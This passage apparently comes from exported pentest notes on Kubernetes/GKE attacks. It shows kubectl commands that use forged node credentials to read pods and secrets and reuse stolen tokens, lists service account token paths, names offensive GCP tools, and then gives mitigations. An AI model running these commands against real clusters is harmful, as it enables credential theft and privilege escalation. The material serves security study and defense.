integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aea3c506-3133-4ba2-a8e6-2249460aa99a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pods -o wide</code></pre><ul id="e1dfd0f2-5f8a-48be-a8a7-21c43687d6ae" class="bulleted-list"><li style="list-style-type:disc">following the steps above provide access to API as <code>system:nodes</code> group</li></ul><ul id="ac8876de-d5f0-4501-9f31-d5d2c8fa419f" class="bulleted-list"><li style="list-style-type:disc"><code>system:nodes</code> group allows pod scheduling and viewing secrets<ul id="0fa39552-e701-4c44-af2c-96cf1c3522d1" class="bulleted-list"><li style="list-style-type:circle">note that you can get secrets, but you can’t list them</li></ul></li></ul><ul id="bab66a5a-28f4-488e-b1e7-eba53279040a" class="bulleted-list"><li style="list-style-type:disc">secret names can be found from pod spec:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3ac316e3-a35a-458f-8729-3cdb5a2c1216" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get pod &lt;POD_NAME&gt; -o yaml</code></pre><p id="7a7b88fb-1562-4311-86eb-38fd731d14db" class="">Get secret:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ca4b074e-9908-4291-b470-56490962984f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --client-certificate node2.crt --client-key k8shack.key --certificate-authority apiserver.crt --server https://${KUBERNETES_PORT_443_TCP_ADDR} get secret &lt;SECRET_NAME&gt; -o yaml</code></pre><ul id="b82a26a3-dc38-4a07-b793-62e139788d2b" class="bulleted-list"><li style="list-style-type:disc">secret is base64 encoded</li></ul><ul id="27c3218b-f6e9-4b97-aa87-c09b29100e69" class="bulleted-list"><li style="list-style-type:disc">if the secret contains a token, you can use it in <code>kubectl</code> with the <code>-token</code> flag, for example:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ebf29651-a153-4a9f-a884-858f5ec46b2c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">kubectl --certificate-authority ca.crt --token &lt;TOKEN&gt; --server https://&lt;MASTER_IP&gt; get all</code></pre><ul id="185c7299-d57a-472f-900d-107a1636ec92" class="bulleted-list"><li style="list-style-type:disc">check if you can access other pods using <code>exec</code></li></ul><h1 id="535fea5c-6bfa-49d7-886a-9141be68eff2" class=""><strong>Service Account Token</strong></h1><p id="61ed59d5-ee00-43db-8199-ec8fb13cc953" class="">Service account token in one of the following locations:</p><p id="af500e64-3884-4004-bb63-5cb2654e7c9a" class=""><code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> or <code>/run/secrets/kubernetes.io/serviceaccount/token</code></p><h1 id="73e49022-dfe2-4650-93cb-4d6b980a0724" class=""><strong>Mitigations</strong></h1><p id="2f5dcbf2-da28-45fe-8198-75988f9c80fc" class=""><strong>Metadata Concealment</strong></p><ul id="d9ea4899-5340-4568-9fde-4c9698a9a41e" class="bulleted-list"><li style="list-style-type:disc">hide <code>kube-env</code> value<p id="cc136ef9-e4d2-451c-81b7-7490c0105ba4" class="">(see the <a href="https://cloud.google.com/kubernetes-engine/docs/how-to/protecting-cluster-metadata">official Google Cloud document</a> for Kubernetes metadata protection)</p></li></ul><ul id="7b87ca49-78bc-4968-b0f8-e85fe2a50c6b" class="bulleted-list"><li style="list-style-type:disc">use <code><strong>-workload-metadata-from-node=SECURE</strong></code><strong> </strong>to conceal metadata<ul id="0f66d82d-fc1e-4578-abd2-2c2b27e2f2c3" class="bulleted-list"><li style="list-style-type:circle">will return “This metada endpoint is concelead” when querying <code>http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env</code></li></ul></li></ul><p id="29651100-be3d-4332-8b27-d3ba89d0d8ad" class=""><strong>Network Policy</strong></p><ul id="591e7415-d1e1-43bb-937d-f6b17a984355" class="bulleted-list"><li style="list-style-type:disc">deny egress by default, whitelist only necessary egress traffic</li></ul><ul id="f8f1d62c-2fe0-41aa-b92e-5d077d2c33d2" class="bulleted-list"><li style="list-style-type:disc">applied to pods since</li></ul><ul id="218fb646-cd2a-49be-ad28-bc6058c5911a" class="bulleted-list"><li style="list-style-type:disc">block metadata service if not needed</li></ul><p id="8244747d-1800-4527-a02f-72cb385faf7a" class=""><strong>Other Mitigations</strong></p><ol type="1" id="d396fb1d-4970-4de4-9916-b63a81323294" class="numbered-list" start="1"><li>Service mesh with egress gateway<ol type="a" id="d5e277e3-9290-45d9-8ea1-ba33ee70f12e" class="numbered-list" start="1"><li>prevent communication from containers to unauthorized hosts</li></ol></li></ol><ol type="1" id="9f1468b4-6dae-4d41-b9f3-c5f8ef8e1cab" class="numbered-list" start="2"><li>Restrict network access to masters<ol type="a" id="889c87a6-6b64-40eb-a54e-a2c00b998c76" class="numbered-list" start="1"><li>Create private cluster with public access disabled and use jumpbox in VPC to access API</li></ol></li></ol><h1 id="12a7944a-44f5-4cca-b25f-46ab1aad4a89" class=""><strong>Tools</strong></h1><p id="3ecf6a8f-1764-4854-8176-9ae9aa2b568f" class=""><a href="https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation">GCP-IAM-Privesc</a></p><ul id="ee27e961-617b-4188-a4ff-6bd45936ca67" class="bulleted-list"><li style="list-style-type:disc">contains privesc scanners and exploits to automate exploitation</li></ul><p id="3aa4481e-7938-49bf-a456-5ef4d1a753b1" class=""><a href="https://github.com/RhinoSecurityLabs/GCPBucketBrute">GCP Bucket Brute</a></p><ul id="53ad8ea7-834b-426a-8e90-52df9e000ec6" class="bulleted-list"><li style="list-style-type:disc">enumerates buckets to see if they can be accessed or used for privilege escalation</li></ul><p id="dc3d9e85-2c3c-47e0-9057-17e716983813" class=""><a href="https://github.com/marcin-kolda/gcp-iam-collector">GCP IAM Collector</a></p><ul id="7f528a83-0531-4dab-8ae0-89df1ee0a429" class="bulleted-list"><li style="list-style-type:disc">provides visualization graph for IAM permissions in GCP environment</li></ul><p id="d65fc205-1fd4-4e00-b726-7ae9e52ef496" class=""><a href="https://github.com/4armed/kubeletmein">Kubeletemein</a></p><ul id="3ab05c4d-6a82-4895-922f-250ea84c6bce" class="bulleted-list"><li style="list-style-type:disc">Kubernetes abuse</li></ul><ul id="d8cf97e6-30f4-4abe-9c3f-95bb5748b9d6" class="bulleted-list"><li style="list-style-type:disc">reads metadata instance attributes, generates CSRs and submits them to the API, and writes out a kubeconfig file for use with <code>kubectl</code></li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>